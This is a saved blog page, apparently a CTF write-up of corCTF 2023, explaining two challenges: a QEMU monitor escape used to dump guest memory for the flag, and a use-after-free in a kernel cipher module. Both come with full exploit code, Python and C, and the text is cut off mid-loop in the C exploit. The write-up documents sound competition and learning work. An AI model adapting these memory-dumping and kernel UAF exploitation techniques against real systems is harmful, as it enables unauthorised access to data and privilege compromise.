<!DOCTYPE html>
<!-- saved from url=(0050)https://blog.libh0ps.so/2023/08/02/corCTF2023.html -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>corfCTF2023 | H0ps CTF adventures</title>
<meta name="generator" content="Jekyll v3.9.3">
<meta property="og:title" content="corfCTF2023">
<meta property="og:locale" content="en_US">
<meta name="description" content="Last weekend I played corCTF with ARESx and DeadSec. The ctf was very good and had high quality challenges. We ended up in 7th place. I solved zeroday, kcipher and almost smm-diary but sadly didn’t have time to finish it. On Kcipher and smm-diary I worked together with my teammate stdnoerr.">
<meta property="og:description" content="Last weekend I played corCTF with ARESx and DeadSec. The ctf was very good and had high quality challenges. We ended up in 7th place. I solved zeroday, kcipher and almost smm-diary but sadly didn’t have time to finish it. On Kcipher and smm-diary I worked together with my teammate stdnoerr.">
<link rel="canonical" href="https://blog.libh0ps.so/2023/08/02/corCTF2023.html">
<meta property="og:url" content="/2023/08/02/corCTF2023.html">
<meta property="og:site_name" content="H0ps CTF adventures">
<meta property="og:type" content="article">
<meta property="article:published_time" content="2023-08-02T00:00:00+00:00">
<meta name="twitter:card" content="summary">
<meta property="twitter:title" content="corfCTF2023">
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-08-02T00:00:00+00:00","datePublished":"2023-08-02T00:00:00+00:00","description":"Last weekend I played corCTF with ARESx and DeadSec. The ctf was very good and had high quality challenges. We ended up in 7th place. I solved zeroday, kcipher and almost smm-diary but sadly didn’t have time to finish it. On Kcipher and smm-diary I worked together with my teammate stdnoerr.","headline":"corfCTF2023","mainEntityOfPage":{"@type":"WebPage","@id":"/2023/08/02/corCTF2023.html"},"url":"/2023/08/02/corCTF2023.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="./corfCTF2023 _ H0ps CTF adventures_files/main.css"><link type="application/atom+xml" rel="alternate" href="https://blog.libh0ps.so/feed.xml" title="H0ps CTF adventures"><style type="text/css">@font-face {
  font-family: 'rbicon';
  src: url(chrome-extension://dipiagiiohfljcicegpgffpbnjmgjcnf/fonts/rbicon.woff2) format("woff2");
  font-weight: normal;
  font-style: normal; }
</style></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="https://blog.libh0ps.so/">H0ps CTF adventures</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger">
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="https://blog.libh0ps.so/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">corfCTF2023</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2023-08-02T00:00:00+00:00" itemprop="datePublished">Aug 2, 2023
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>Last weekend I played corCTF with <a href="https://twitter.com/ARESxCTF">ARESx</a> and <a href="https://twitter.com/DeadSec">DeadSec</a>. The ctf was very good and had high quality challenges. We ended up in 7th place. I solved <a href="https://blog.libh0ps.so/2023/08/02/corCTF2023.html#zeroday-sec">zeroday</a>, <a href="https://blog.libh0ps.so/2023/08/02/corCTF2023.html#kcipher-sec">kcipher</a> and almost <a href="https://blog.libh0ps.so/2023/08/02/corCTF2023.html#smm-diary-sec">smm-diary</a> but sadly didn’t have time to finish it. On Kcipher and smm-diary I worked together with my teammate <a href="https://twitter.com/stdnoerr">stdnoerr</a>.</p>

<p>This post is a writeup about the three challenges. The full exploit codes and challenge files can be found in my <a href="https://github.com/Ollrogge/CtfWriteups">repository</a>.</p>

<h2 id="zeroday-sec">zeroday</h2>
<p><img src="./corfCTF2023 _ H0ps CTF adventures_files/corctf2023-zeroday.png" alt="zeroday">
Zero day was a kernel pwn challenge with a twist. We are given a linux kernel setup with a very recent kernel an no kernel module to pwn. As the challenge description hints, the bug lays somewhere in the configuration of the challenge rather than in the kernel.</p>

<p>When we look at the qemu run config we see nothing suspicious at the beginning.</p>

<pre><code class="language-txt">qemu-system-x86_64 \
    -s \
    -m 128M \
    -nographic \
    -kernel "./bzImage" \
    -append "console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on" \
    -no-reboot \
    -cpu qemu64,+smep,+smap \
    -smp 2 \
    -initrd "./my_initramfs.cpio.gz"
</code></pre>

<p>While comparing it with configs of other ctf kernel challs I noticed however that <code class="language-plaintext highlighter-rouge">-monitor none</code> option is not supplied. So I tried to enter qemu monitor mode by pressing <code class="language-plaintext highlighter-rouge">CTRL-a c</code> and it worked :)</p>

<p>To get the flag I used the fact that the challenge uses <code class="language-plaintext highlighter-rouge">ramfs</code> and simply dumped the heap using the <code class="language-plaintext highlighter-rouge">x</code> command and then searched for the flag. I obtained a heap address by reading the GS segment register value using the <code class="language-plaintext highlighter-rouge">info registers</code> command.</p>

<h3 id="exploit">Exploit</h3>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"be.ax"</span><span class="p">,</span> <span class="mi">32578</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"work:"</span><span class="p">)</span>
<span class="n">command</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">rstrip</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="s">"command: "</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span>
<span class="n">process</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">)</span>
<span class="n">stdout</span><span class="p">,</span> <span class="n">stderr</span> <span class="o">=</span> <span class="n">process</span><span class="p">.</span><span class="n">communicate</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">stdout</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"solution:"</span><span class="p">,</span> <span class="n">stdout</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"$"</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">'</span><span class="se">\x01</span><span class="s">'</span> <span class="o">+</span> <span class="s">'c'</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"info registers"</span><span class="p">)</span>
<span class="n">bla</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"XMM14"</span><span class="p">)</span>
<span class="n">gs_address</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s">'GS =\S+ (\S+)'</span><span class="p">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">bla</span><span class="p">)</span>

<span class="k">if</span> <span class="n">gs_address</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="n">gs_address</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>

<span class="n">heap_leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">gs_address</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="mh">0x10</span><span class="p">)</span>
<span class="n">addr</span><span class="o">=</span> <span class="n">heap_leak</span> <span class="o">-</span> <span class="mh">0x400000</span>
                  <span class="mh">0x1b3000</span>

<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"(qemu)"</span><span class="p">)</span>
<span class="n">leak</span> <span class="o">=</span> <span class="s">""</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"leaks"</span><span class="p">,</span> <span class="s">"wb+"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">300</span><span class="p">):</span>
        <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s">"x/10000gx </span><span class="si">{</span><span class="n">addr</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="n">leak</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"(qemu)"</span><span class="p">)</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
        <span class="n">addr</span> <span class="o">+=</span> <span class="mi">10000</span><span class="o">*</span><span class="mi">8</span><span class="p">;</span>

<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<h2 id="kcipher-sec">kcipher</h2>
<p><img src="./corfCTF2023 _ H0ps CTF adventures_files/corctf2023-kcipher.png" alt="kcipher"></p>

<p>Kcipher was a usual kernel pwn challenge. The challenge kernel module provides encryption functionality for <code class="language-plaintext highlighter-rouge">ROT</code>, <code class="language-plaintext highlighter-rouge">XOR</code>, <code class="language-plaintext highlighter-rouge">A1Z26</code> and <code class="language-plaintext highlighter-rouge">ATBASH</code>. We can select one of the operations and an argument for the operation, e.g. the value that will be used for XOR, and the module will create a file instance with the crypto operations as file operations and return a file descriptor to us.</p>

<p>Following is the important functionality in <code class="language-plaintext highlighter-rouge">device_ioctl</code>:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span> <span class="p">(</span><span class="n">param_2</span> <span class="o">==</span> <span class="o">-</span><span class="mh">0x12411100</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">puVar1</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)</span><span class="n">kmalloc_trace</span><span class="p">(</span><span class="n">___unregister_chrdev</span><span class="p">,</span><span class="mh">0x400dc0</span><span class="p">,</span><span class="mh">0x60</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">puVar1</span> <span class="o">==</span> <span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">lVar2</span> <span class="o">=</span> <span class="o">-</span><span class="mh">0xc</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="n">puVar1</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="n">fd</span> <span class="o">=</span> <span class="n">anon_inode_getfd</span><span class="p">(</span><span class="s">"kcipher-buf"</span><span class="p">,</span><span class="n">kcipher_cipher_fops</span><span class="p">,</span><span class="n">puVar1</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">kfree</span><span class="p">(</span><span class="n">puVar1</span><span class="p">);</span>
        <span class="k">return</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">fd</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="n">lVar2</span> <span class="o">=</span> <span class="n">_copy_from_user</span><span class="p">(</span><span class="n">puVar1</span><span class="p">,</span><span class="n">param_3</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">lVar2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">puVar1</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
          <span class="n">strncpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">puVar1</span> <span class="o">+</span> <span class="mi">7</span><span class="p">),(</span><span class="o">&amp;</span><span class="n">ciphers</span><span class="p">)[</span><span class="o">*</span><span class="n">puVar1</span><span class="p">],</span><span class="mh">0x40</span><span class="p">);</span>
          <span class="k">return</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">fd</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">lVar2</span> <span class="o">=</span> <span class="o">-</span><span class="mh">0x16</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="n">kfree</span><span class="p">(</span><span class="n">puVar1</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
</code></pre></div></div>

<p>Once we have a <code class="language-plaintext highlighter-rouge">fd</code> specific to the cryptographic operation, we can pass our input for encryption by writing to the <code class="language-plaintext highlighter-rouge">fd</code> which will execute the <code class="language-plaintext highlighter-rouge">cipher_write</code> function and obtain the encrypted result by reading from it which will execute the <code class="language-plaintext highlighter-rouge">cipher_read</code> function.</p>

<h3 id="bug">Bug</h3>
<p>The bug does not lay in any of the cryptographic operations as I initially anticipated. It is actually in the <code class="language-plaintext highlighter-rouge">device_ioctl</code> function shown above.</p>

<p>The module first allocates a chunk of size <code class="language-plaintext highlighter-rouge">0x60</code> which will store the <code class="language-plaintext highlighter-rouge">private_data</code> of the file struct created as a result of calling <code class="language-plaintext highlighter-rouge">anon_inode_getfd</code>. Afterwards it then copies 8 bytes from user space and checks if the first 4 bytes interpreted as integer are smaller 4. This integer specifies the index of the cryptographic operations one wants to execute. If the number is <strong>bigger or equal</strong> than 4 it frees the private data chunk, however the module does not close the file descriptor. Therefore, we have an <code class="language-plaintext highlighter-rouge">UAF</code> on a <code class="language-plaintext highlighter-rouge">kmalloc-96</code> chunk.</p>

<p>To exploit this we first obtained two <code class="language-plaintext highlighter-rouge">fds</code> for cryptographic operations. For the first one we triggered the vulnerability, freeing its <code class="language-plaintext highlighter-rouge">private_data</code> chunk. We then wrote 0x60 bytes to the second <code class="language-plaintext highlighter-rouge">fd</code> in order to trigger an allocation of a <code class="language-plaintext highlighter-rouge">kmalloc-96</code> chunk and therefore obtain the just freed <code class="language-plaintext highlighter-rouge">private_data</code> chunk. Since the <code class="language-plaintext highlighter-rouge">cipher_write</code> function uses <code class="language-plaintext highlighter-rouge">strncpy_from_user</code> we only filled <code class="language-plaintext highlighter-rouge">0xf</code> bytes of our buffer and then obtained a heap leak by reading the from the second fd.</p>

<p>We can obtain a heap leak this way, since the <code class="language-plaintext highlighter-rouge">private_data</code> chunk stores information about the buffer we provide for encryption. Specifially, it stores the pointer to the chunk allocated to hold our data at offset <code class="language-plaintext highlighter-rouge">0x10</code> as can be seen in the following disassembly of parts of the <code class="language-plaintext highlighter-rouge">cipher_write</code> function:</p>

<p><img src="./corfCTF2023 _ H0ps CTF adventures_files/corctf2023-kcipher2.png" alt="cipher_write"></p>

<p>Having obtained a heap leak we thought about how we could exploit the UAF to escalate privileges to root but since this challenge also uses ramfs we decided to go the lazy route and simply search the heap for the flag. We obtained an AAR primitive by repeatedly overwriting the data chunk ptr stored in the UAFed <code class="language-plaintext highlighter-rouge">private_data</code> chunk and then reading from the corrupted <code class="language-plaintext highlighter-rouge">fd</code>.</p>

<h3 id="exploit-1">Exploit</h3>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define _GNU_SOURCE
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sched.h&gt;
#include &lt;stdio.h&gt;
#include &lt;errno.h&gt;
#include &lt;stdarg.h&gt;
#include &lt;stdbool.h&gt;
#include &lt;stdint.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;sys/prctl.h&gt;
#include &lt;sys/resource.h&gt;
#include &lt;sys/msg.h&gt;
#include &lt;sys/timerfd.h&gt;
#include &lt;sys/ioctl.h&gt;
</span>

<span class="cp">#define DEV_PATH "/dev/kcipher"   // the path the device is placed
</span>
<span class="cp">#define ulong unsigned long
#define PAGE_SZ 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
#define ARRAY_SIZE(a) (sizeof((a)) / sizeof((a)[0]))
#define HEAP_MASK 0xffff000000000000
#define KERNEL_MASK 0xffffffff00000000
</span>
<span class="cp">#define WAIT(void) {getc(stdin); \
                    fflush(stdin);}
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
</span>
<span class="cp">#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &amp;msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
                            errExit("KMALLOC"); \
                        }
</span><span class="k">static</span> <span class="kt">void</span> <span class="nf">print_hex8</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span> <span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint64_t</span><span class="o">*</span> <span class="n">tmp</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="n">len</span> <span class="o">/</span> <span class="mi">8</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"%d: %p "</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">tmp</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">info</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="p">...)</span> <span class="p">{</span>
    <span class="kt">va_list</span> <span class="n">args</span><span class="p">;</span>
    <span class="n">va_start</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">format</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] "</span><span class="p">);</span>
    <span class="n">vprintf</span><span class="p">(</span><span class="n">format</span><span class="p">,</span> <span class="n">args</span><span class="p">);</span>

    <span class="n">va_end</span><span class="p">(</span><span class="n">args</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">error</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="p">...)</span> <span class="p">{</span>
    <span class="kt">va_list</span> <span class="n">args</span><span class="p">;</span>
    <span class="n">va_start</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">format</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[x] "</span><span class="p">);</span>
    <span class="n">vprintf</span><span class="p">(</span><span class="n">format</span><span class="p">,</span> <span class="n">args</span><span class="p">);</span>

    <span class="n">va_end</span><span class="p">(</span><span class="n">args</span><span class="p">);</span>
<span class="p">}</span>

<span class="cp">#define CMD_ALLOC 0x13370000
#define CMD_FLIP  0x13370001
</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">alloc</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">sz</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">off</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">CMD_ALLOC</span><span class="p">,</span> <span class="n">sz</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">errExit</span><span class="p">(</span><span class="s">"ioctl"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">flip</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">int</span> <span class="n">off</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">CMD_FLIP</span><span class="p">,</span> <span class="n">off</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">errExit</span><span class="p">(</span><span class="s">"ioctl"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">get_cipher_fd</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">cipher_num</span><span class="p">,</span> <span class="n">bool</span> <span class="n">ok_fail</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">_fd</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0xedbeef00</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cipher_num</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">_fd</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">ok_fail</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">errExit</span><span class="p">(</span><span class="s">"get_cipher_fd"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">_fd</span><span class="p">;</span>
<span class="p">}</span>

<span class="cp">#define CRYPTO_ROT 0
#define CRYPTO_XOR 1
#define CRYPTO_ALZ26 2
#define CRYPTO_ATBASH 3
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>

    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">DEV_PATH</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">errExit</span><span class="p">(</span><span class="s">"open"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
    <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"Buf: %s </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
    <span class="n">print_hex8</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>

    <span class="kt">uint64_t</span> <span class="n">crypto_op</span> <span class="o">=</span> <span class="n">CRYPTO_XOR</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">crypto_arg</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>

    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
    <span class="kt">int</span> <span class="n">fd2</span> <span class="o">=</span> <span class="n">get_cipher_fd</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">crypto_arg</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span> <span class="o">|</span> <span class="n">crypto_op</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
    <span class="n">get_cipher_fd</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="nb">true</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">fd3</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>

    <span class="n">write</span><span class="p">(</span><span class="n">fd3</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">);</span>

    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">'A'</span><span class="p">,</span> <span class="mh">0xf</span><span class="p">);</span>

    <span class="n">ret</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">fd2</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="n">fd2</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">);</span>

    <span class="n">print_hex8</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>

    <span class="kt">uint64_t</span><span class="o">*</span> <span class="n">p_buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">heap_leak</span> <span class="o">=</span> <span class="n">p_buf</span><span class="p">[</span><span class="mh">0x2</span><span class="p">];</span>
    <span class="n">info</span><span class="p">(</span><span class="s">"heap_leak: %p </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">heap_leak</span><span class="p">);</span>

    <span class="kt">uint64_t</span> <span class="n">read_addr</span> <span class="o">=</span> <span class="n">heap_leak</span> <span class="o">-</span> <span class="mh">0xa00000</span><span class="p">;</span>

    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
    <span class="n">p_buf</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">heap_leak</span><span class="p">;</span>
    <span class="n">p_buf</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">read_addr</span><span class="p">;</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">fd2</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">);</span>

    <span class="n">info</span><span class="p">(</span><span class="s">"reading from : %p </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">read_addr</span><span class="p">);</span>

    <span class="k">while</span><span class="p">(</span><span class="nb">true</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
        <span class="n">p_buf</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">read_addr</span><span class="p">;</span>
